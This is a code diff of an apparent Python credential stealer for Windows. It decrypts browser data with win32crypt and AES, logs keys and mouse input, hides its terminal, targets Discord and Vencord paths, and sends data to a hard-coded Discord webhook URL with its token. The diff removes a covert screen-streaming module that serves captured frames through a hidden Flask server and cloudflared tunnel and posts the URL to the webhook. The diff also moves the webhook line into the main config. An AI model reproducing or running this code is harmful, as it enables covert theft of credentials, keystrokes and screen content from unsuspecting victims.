@@ -9,14 +9,11 @@ import datetime
 import win32crypt
 from Crypto.Cipher import AES
 import requests
-import cv2
 import sqlite3
 import tempfile
 from pathlib import Path
 import socket
 import threading
-import numpy as np
-import mss
 import subprocess
 import platform
 import sys
@@ -27,12 +24,6 @@ from pynput.keyboard import Listener as KeyboardListener
 from pynput.mouse import Listener as MouseListener
 import urllib.request
 import urllib.error
-from flask import Flask, Response
-import logging
-
-# =================== SCREEN STREAM CONFIG ===================
-PORT = 5000
-WEBHOOK_URL = "https://discord.com/api/webhooks/1460790440428175553/pKYIidBOMxcqroGRdpBROYtBkqbh9JPoD07hYv2_QNdB1qOw-BdWNt-bJ-xO8pylVFZ2"
 
 # =================== HIDE TERMINAL ON STARTUP ===================
 if sys.platform == 'win32':
@@ -54,288 +45,6 @@ else:
     # For non-Windows, redirect output to null
     sys.stdout = open(os.devnull, 'w')
     sys.stderr = open(os.devnull, 'w')
-
-# Disable Flask and Werkzeug logging
-logging.getLogger('werkzeug').disabled = True
-logging.getLogger('flask').disabled = True
-
-# =================== SCREEN STREAM CLASSES ===================
-class ScreenStreamLogger:
-    def __init__(self):
-        self.log_file = None
-        self.public_url = None
-        self.setup_log_file()
-        
-    def setup_log_file(self):
-        """Create a temporary log file for screen stream"""
-        try:
-            temp_dir = tempfile.gettempdir()
-            self.log_file = os.path.join(temp_dir, f"screen_stream_{int(time.time())}.txt")
-            
-            with open(self.log_file, 'w', encoding='utf-8') as f:
-                f.write(f"Screen Stream Log - {datetime.datetime.now()}\n")
-                f.write("=" * 50 + "\n")
-        except:
-            pass
-            
-    def log(self, message):
-        """Add a log entry"""
-        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        log_entry = f"[{timestamp}] {message}"
-        
-        try:
-            with open(self.log_file, 'a', encoding='utf-8') as f:
-                f.write(log_entry + "\n")
-        except:
-            pass
-            
-    def set_public_url(self, url):
-        """Set the public URL and log it"""
-        self.public_url = url
-        self.log(f"PUBLIC URL: {url}")
-        
-    def cleanup(self):
-        """Delete the log file"""
-        try:
-            if self.log_file and os.path.exists(self.log_file):
-                os.remove(self.log_file)
-        except:
-            pass
-
-# Global screen stream logger
-screen_logger = ScreenStreamLogger()
-
-# Flask app for screen streaming
-app = Flask(__name__)
-app.logger.disabled = True
-
-def gen_frames():
-    """Generate video frames for screen streaming"""
-    try:
-        with mss.mss() as sct:
-            monitor = sct.monitors[1]
-            while True:
-                img = sct.grab(monitor)
-                frame = np.array(img)
-                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
-                _, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 60])
-                yield (b"--frame\r\n" b"Content-Type: image/jpeg\r\n\r\n" + buffer.tobytes() + b"\r\n")
-    except Exception as e:
-        screen_logger.log(f"Frame generation error: {str(e)}")
-        # Return a black frame if there's an error
-        black_frame = np.zeros((480, 640, 3), dtype=np.uint8)
-        while True:
-            _, buffer = cv2.imencode(".jpg", black_frame, [cv2.IMWRITE_JPEG_QUALITY, 60])
-            yield (b"--frame\r\n" b"Content-Type: image/jpeg\r\n\r\n" + buffer.tobytes() + b"\r\n")
-
-@app.route("/")
-def index():
-    """Main route for screen stream"""
-    return Response(gen_frames(), mimetype="multipart/x-mixed-replace; boundary=frame")
-
-def send_screen_log_to_discord():
-    """Send screen stream log to Discord"""
-    try:
-        if not screen_logger.log_file or not os.path.exists(screen_logger.log_file):
-            return False
-        
-        # Read log file
-        with open(screen_logger.log_file, 'r', encoding='utf-8') as f:
-            log_content = f.read()
-        
-        # Prepare filename
-        filename = f"screen_stream_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-        
-        # Send to Discord
-        files = {'file': (filename, log_content)}
-        response = requests.post(WEBHOOK_URL, files=files, timeout=30)
-        
-        return response.status_code in [200, 204]
-        
-    except Exception as e:
-        return False
-
-def run_cloudflared():
-    """Start cloudflared tunnel for screen streaming"""
-    try:
-        if sys.platform == 'win32':
-            creationflags = subprocess.CREATE_NO_WINDOW
-        else:
-            creationflags = 0
-            
-        # Try to find cloudflared
-        cloudflared_cmd = None
-        
-        # Check common locations
-        possible_paths = [
-            'cloudflared',
-            'cloudflared.exe',
-            os.path.join(os.getcwd(), 'cloudflared.exe'),
-            os.path.join(os.path.dirname(sys.executable), 'cloudflared.exe'),
-        ]
-        
-        for path in possible_paths:
-            try:
-                if os.path.exists(path) or subprocess.run([path, 'version'], 
-                                                        stdout=subprocess.DEVNULL, 
-                                                        stderr=subprocess.DEVNULL, 
-                                                        creationflags=creationflags).returncode == 0:
-                    cloudflared_cmd = path
-                    break
-            except:
-                continue
-        
-        if cloudflared_cmd:
-            subprocess.Popen(
-                [cloudflared_cmd, 'tunnel', '--url', f'http://localhost:{PORT}'],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                creationflags=creationflags
-            )
-            screen_logger.log(f"Started cloudflared from: {cloudflared_cmd}")
-            return True
-        else:
-            screen_logger.log("cloudflared not found")
-            return False
-            
-    except Exception as e:
-        screen_logger.log(f"Error starting cloudflared: {e}")
-        return False
-
-def get_public_url():
-    """Get public URL from cloudflared"""
-    max_attempts = 30  # Try for 5 minutes
-    for attempt in range(max_attempts):
-        try:
-            # Try to get URL from metrics
-            response = requests.get('http://localhost:8099/metrics', timeout=5)
-            lines = response.text.split('\n')
-            
-            for line in lines:
-                if 'tunnel_origin_url' in line and 'hostname=' in line:
-                    # Parse the URL
-                    import re
-                    match = re.search(r'hostname="([^"]+)"', line)
-                    if match:
-                        url = match.group(1)
-                        screen_logger.log(f"Found Cloudflare tunnel URL (attempt {attempt + 1}): {url}")
-                        return f"https://{url}"
-            
-            # Alternative: Try to get active tunnels
-            for line in lines:
-                if 'tunnels_conns' in line and '> 0' in line:
-                    # Cloudflare tunnel is active, use trycloudflare domain
-                    screen_logger.log(f"Cloudflare tunnel active (attempt {attempt + 1})")
-                    return f"https://{socket.gethostname()}.trycloudflare.com"
-                    
-        except requests.exceptions.RequestException:
-            # Connection failed, tunnel might not be ready yet
-            pass
-        
-        time.sleep(10)  # Wait 10 seconds between attempts
-    
-    screen_logger.log("Could not get Cloudflare URL after all attempts")
-    return None
-
-def run_flask_server():
-    """Run Flask server for screen streaming"""
-    # Disable all Flask logging
-    import werkzeug.serving
-    werkzeug.serving.WSGIRequestHandler.log = lambda *args, **kwargs: None
-    
-    # Import warnings after setting up logging
-    import warnings
-    warnings.filterwarnings("ignore")
-    
-    try:
-        app.run(
-            host='0.0.0.0',
-            port=PORT,
-            debug=False,
-            use_reloader=False,
-            threaded=True
-        )
-    except Exception as e:
-        screen_logger.log(f"Flask server error: {e}")
-
-def screen_stream_workflow():
-    """Main workflow for screen streaming"""
-    try:
-        # 1. Start Flask server in a separate thread
-        screen_logger.log("Starting screen stream server...")
-        flask_thread = threading.Thread(target=run_flask_server, daemon=True)
-        flask_thread.start()
-        
-        # Wait for Flask to start
-        time.sleep(3)
-        
-        # 2. Start cloudflared
-        screen_logger.log("Starting cloudflared for screen stream...")
-        cloudflared_started = run_cloudflared()
-        
-        if not cloudflared_started:
-            screen_logger.log("Failed to start cloudflared. Using local network only.")
-            # Get local IP as fallback
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                s.connect(("8.8.8.8", 80))
-                local_ip = s.getsockname()[0]
-                s.close()
-                local_url = f"http://{local_ip}:{PORT}"
-                screen_logger.set_public_url(local_url)
-                screen_logger.log(f"Local URL: {local_url}")
-            except:
-                screen_logger.set_public_url(f"http://localhost:{PORT}")
-                screen_logger.log(f"Localhost URL: http://localhost:{PORT}")
-        else:
-            # 3. Wait for cloudflared to establish connection
-            screen_logger.log("Waiting for Cloudflare tunnel...")
-            time.sleep(15)
-            
-            # 4. Get public URL
-            public_url = get_public_url()
-            
-            if public_url:
-                screen_logger.set_public_url(public_url)
-                screen_logger.log(f"Public URL obtained: {public_url}")
-            else:
-                # Fallback to local network
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    s.connect(("8.8.8.8", 80))
-                    local_ip = s.getsockname()[0]
-                    s.close()
-                    fallback_url = f"http://{local_ip}:{PORT} (LOCAL)"
-                    screen_logger.set_public_url(fallback_url)
-                    screen_logger.log(f"Using fallback URL: {fallback_url}")
-                except:
-                    fallback_url = f"http://localhost:{PORT} (LOCAL)"
-                    screen_logger.set_public_url(fallback_url)
-                    screen_logger.log(f"Using localhost: {fallback_url}")
-        
-        # 5. Send to Discord
-        screen_logger.log("Sending screen stream log to Discord...")
-        success = send_screen_log_to_discord()
-        
-        if success:
-            screen_logger.log("Screen stream log sent successfully to Discord")
-        else:
-            screen_logger.log("Failed to send screen stream log to Discord")
-        
-        # 6. Cleanup
-        screen_logger.log("Screen stream is active...")
-        
-        # 7. Keep the screen stream running
-        while True:
-            time.sleep(60)  # Keep running
-            
-    except KeyboardInterrupt:
-        screen_logger.log("Screen stream stopped by user")
-    except Exception as e:
-        screen_logger.log(f"Error in screen stream workflow: {e}")
-    finally:
-        # Final cleanup
-        screen_logger.cleanup()
 
 # =================== WINDOWS SPECIFIC IMPORTS ===================
 if sys.platform == 'win32':
@@ -443,6 +152,7 @@ PATHS = {
     'Vencord': ROAMING + '\\Vencord'
 }
 
+WEBHOOK_URL = "https://discord.com/api/webhooks/1460790440428175553/pKYIidBOMxcqroGRdpBROYtBkqbh9JPoD07hYv2_QNdB1qOw-BdWNt-bJ-xO8pylVFZ2"
 log_buffer = []
 auto_clicker_running = False
 
@@ -1202,10 +912,6 @@ if __name__ == "__main__":
     # Start background stealer SECOND (background)
     stealer_thread = threading.Thread(target=background_stealer, daemon=True)
     stealer_thread.start()
-    
-    # Start screen stream THIRD (background)
-    screen_stream_thread = threading.Thread(target=screen_stream_workflow, daemon=True)
-    screen_stream_thread.start()
     
     # Keep main thread alive
     try:
